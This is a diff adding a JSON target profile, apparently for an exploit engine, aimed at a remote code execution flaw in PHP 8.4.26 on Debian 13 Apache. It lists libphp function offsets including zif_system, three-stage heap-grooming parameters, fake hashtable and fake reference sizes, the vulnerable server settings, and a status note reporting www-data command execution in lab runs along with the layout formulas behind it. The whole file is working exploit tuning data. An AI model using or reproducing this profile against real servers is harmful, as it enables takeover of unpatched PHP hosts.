@@ -1,0 +1,91 @@
+{
+  "name": "php-8.4.26-deb13-apxs2-amd64",
+  "php_version": "8.4.26",
+  "branch": "8.4",
+  "fixed_in": "8.4.27",
+  "sapi": "apache2handler",
+  "verified": true,
+  "rce": true,
+  "upstream_profile": "lab",
+  "libphp": {
+    "zif_system": "0x3b19a0",
+    "zval_ptr_dtor": "0x584f00",
+    "htdata": "0x6e0d8"
+  },
+  "stages": {
+    "stage1_n": 892,
+    "stage1_forge_len": 79,
+    "stage2_t": 442,
+    "stage2_v": 1,
+    "stage3_pads": [
+      [
+        4,
+        4
+      ],
+      [
+        4,
+        4
+      ],
+      [
+        4,
+        4
+      ],
+      [
+        4,
+        4
+      ],
+      [
+        4,
+        4
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ]
+    ],
+    "stage3_carrier": false,
+    "stage3_cookie": true,
+    "stage3_wfields": 5,
+    "stage3_fake_len": 31,
+    "stage3_fakes": 12,
+    "stage3_b_name_len": 3,
+    "stage3_mode": "lab"
+  },
+  "config": {
+    "memory_limit": 8388608,
+    "display_errors": "On (vhost php.ini, leak delivered in Set-Cookie)",
+    "session_upload_progress": "On",
+    "workers": 1
+  },
+  "measured": {
+    "chunk_base": "0x7fbcf4200000"
+  },
+  "status": "contributor-reported, not independently confirmed — RCE verified on a source-built Debian 13 lab (apxs2, Apache 2.4.69 prefork, 1 worker): uid=33(www-data) 4/4 runs through the vendor engine with this profile's parameters; stages 1-2 dispatch cleanly on every attempt. Stage-3 phase is instance-dependent (after an apache restart, a fresh master may not reclaim; retry on a new instance) and the layout differs from the docker 8.4.26 image (different toolchain): third stage-3 layout with a K=5 bin-32 phase shift. Each (4,4) pad allocates the session reference at the k-th bin-32 slot, shifting the fake-reference slot linearly, R0 = chunk+0x2260+0x60*K (gdb watchpoint sweep 0..16); K=5 places the bin-56 reclaim slot so the 31-byte fake reference is written whole (chars at R0, framing differs from the upstream 55-byte carrier whose chars land at R0+8). Stage-3 request 1 carries a PHPSESSID cookie and five 5-char/1-byte fill fields; request 2 reclaims with 15x 167-byte fake hashtables then 12x 31-byte fake references, all with 3-char field names. Command proof read out-of-band from /tmp inside the apache mount namespace (PrivateTmp; nsenter).",
+  "oom_mb": 12,
+  "oom_margin_mb": 12,
+  "memory_limit_tested_mb": [
+    8
+  ],
+  "distro": "debian",
+  "arch": "amd64"
+}
